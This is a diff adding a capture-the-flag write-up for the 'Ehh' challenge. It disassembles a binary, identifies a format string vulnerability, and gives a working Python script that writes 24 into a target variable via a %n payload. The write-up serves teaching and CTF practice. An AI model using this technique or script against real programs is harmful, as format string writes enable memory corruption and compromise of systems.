@@ -294,3 +294,154 @@ we found this interesting string ** 7h3_m057_53cr37357_p455w0rd_y0u_3v3r_54w ** 
 
 ![yeahright](https://github.com/SkyBulk/tuCTF/blob/master/images/yeahright.png)
 
+# Ehh
+
+** Hint **
+
+> Difficulty: easy Whatever... I dunno
+
+** Test Run **
+
+> First, let's run the program locally.
+
+We can see that there are some hex digits printed out and some gibberish being echoed back. In order to determine what happen, let's disassemble it.
+
+```bash
+gdb-peda$ disas main
+Dump of assembler code for function main:
+   0x00000670 <+0>:	lea    ecx,[esp+0x4]
+   0x00000674 <+4>:	and    esp,0xfffffff0
+   0x00000677 <+7>:	push   DWORD PTR [ecx-0x4]
+   0x0000067a <+10>:	push   ebp
+   0x0000067b <+11>:	mov    ebp,esp
+   0x0000067d <+13>:	push   ebx
+   0x0000067e <+14>:	push   ecx
+   0x0000067f <+15>:	sub    esp,0x20
+   0x00000682 <+18>:	call   0x540 <__x86.get_pc_thunk.bx>
+   0x00000687 <+23>:	add    ebx,0x1979
+   0x0000068d <+29>:	mov    eax,DWORD PTR [ebx-0x10]
+   0x00000693 <+35>:	mov    eax,DWORD PTR [eax]
+   0x00000695 <+37>:	push   0x14
+   0x00000697 <+39>:	push   0x2
+   0x00000699 <+41>:	push   0x0
+   0x0000069b <+43>:	push   eax
+   0x0000069c <+44>:	call   0x4e0 <setvbuf@plt>
+   0x000006a1 <+49>:	add    esp,0x10
+   0x000006a4 <+52>:	mov    eax,DWORD PTR [ebx-0x14]
+   0x000006aa <+58>:	mov    eax,DWORD PTR [eax]
+   0x000006ac <+60>:	push   0x14
+   0x000006ae <+62>:	push   0x2
+   0x000006b0 <+64>:	push   0x0
+   0x000006b2 <+66>:	push   eax
+   0x000006b3 <+67>:	call   0x4e0 <setvbuf@plt>
+   0x000006b8 <+72>:	add    esp,0x10
+   0x000006bb <+75>:	sub    esp,0x8
+   0x000006be <+78>:	lea    eax,[ebx+0x28]
+   0x000006c4 <+84>:	push   eax
+   0x000006c5 <+85>:	lea    eax,[ebx-0x1850]
+   0x000006cb <+91>:	push   eax
+   0x000006cc <+92>:	call   0x4b0 <printf@plt>
+   0x000006d1 <+97>:	add    esp,0x10
+   0x000006d4 <+100>:	sub    esp,0x4
+   0x000006d7 <+103>:	push   0x18
+   0x000006d9 <+105>:	lea    eax,[ebp-0x20]
+   0x000006dc <+108>:	push   eax
+   0x000006dd <+109>:	push   0x0
+   0x000006df <+111>:	call   0x4a0 <read@plt>
+   0x000006e4 <+116>:	add    esp,0x10
+   0x000006e7 <+119>:	sub    esp,0xc
+   0x000006ea <+122>:	lea    eax,[ebp-0x20]
+   0x000006ed <+125>:	push   eax
+   0x000006ee <+126>:	call   0x4b0 <printf@plt>
+   0x000006f3 <+131>:	add    esp,0x10
+   0x000006f6 <+134>:	mov    eax,DWORD PTR [ebx+0x28]
+   0x000006fc <+140>:	cmp    eax,0x18
+   0x000006ff <+143>:	jne    0x713 <main+163>
+   0x00000701 <+145>:	sub    esp,0xc
+   0x00000704 <+148>:	lea    eax,[ebx-0x182e]
+   0x0000070a <+154>:	push   eax
+   0x0000070b <+155>:	call   0x4c0 <system@plt>
+   0x00000710 <+160>:	add    esp,0x10
+   0x00000713 <+163>:	mov    eax,0x0
+   0x00000718 <+168>:	lea    esp,[ebp-0x8]
+   0x0000071b <+171>:	pop    ecx
+   0x0000071c <+172>:	pop    ebx
+   0x0000071d <+173>:	pop    ebp
+   0x0000071e <+174>:	lea    esp,[ecx-0x4]
+   0x00000721 <+177>:	ret    
+End of assembler dump.
+gdb-peda$ 
+```
+
+Due to the amount of time I can spend on a challenge before failing my exams, I quickly decompile it.
+
+![ehh](https://github.com/SkyBulk/tuCTF/blob/master/images/ehh.png)
+
+
+We can therefore see that it is most likely a format string attack since there is a printf(&buf); after reading user input.
+
+To test it out,
+
+![ehh](https://github.com/SkyBulk/tuCTF/blob/master/images/ehh_1.png)
+
+
+Now, AAAA is stored as hex ini the 6th position. We can confirm that with %6$n.
+
+![ehh](https://github.com/SkyBulk/tuCTF/blob/master/images/ehh_2.png)
+
+
+The aim for this program to print the flag is to make sure the variable val is 24. It is currently a non 24 number. Before proceeding, we need to find out the address of val so we can write into that memory. Also, this program is not stripped meaning we can most likely find the address by typing p &val.
+
+
+![ehh](https://github.com/SkyBulk/tuCTF/blob/master/images/ehh_3.png)
+
+It is 0x56557028. Also we need to store int 24 and we will use the %n format to write it into the address.
+
+In the payload, we add the target address followed by 24 bytes written followed by %n format. Since we are targetting the 6th position, our payload can look something like this.
+
+```python
+payload = ''
+payload += struct.pack("<L",leak)
+payload += '%{}x'.format(0x18-4)  # overwrite 0x5656b028 to 0x18
+payload += '%6$n' # output AAAAAAAAAAAA 0xffaac0a80 x18(nil) 0xf7f3d3fc0 x565790000 x41414141 #payload AAAA%p%p%p%p%p%p%p  %p$6$n
+```
+
+For this challenge, the target address is always changing since ASLR is enabled on the server as well. However, the good news is that the target's address is printed out >Input interesting text here< 0x565ec028.
+
+So we can write a script to get that value and setup our payload then submit it to get the flag.
+
+** The python script **
+
+```python 
+
+#!/usr/bin/python
+
+"""
+gdb-peda$ checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : ENABLED
+RELRO     : Partial
+
+"""
+import struct
+import socket
+import subprocess
+
+
+proc = subprocess.Popen(['./ehh'], stdout = subprocess.PIPE, stdin = subprocess.PIPE)
+leak = proc.stdout.readline() # >Input interesting text here< 0x565ba028
+leak = leak.split(' ')[4].strip() # 0x56615028
+leak = int(leak,16) # 1448632360
+#addr = int(leak[2:10],16)
+
+payload = ''
+payload += struct.pack("<L",leak)
+payload += '%{}x'.format(0x18-4)  # overwrite 0x5656b028 to 0x18
+payload += '%6$n' # output AAAAAAAAAAAA 0xffaac0a80 x18(nil) 0xf7f3d3fc0 x565790000 x41414141 #payload AAAA%p%p%p%p%p%p%p  %p$6$n
+
+proc.stdin.write(payload)
+print proc.stdout.readline()
+
+```
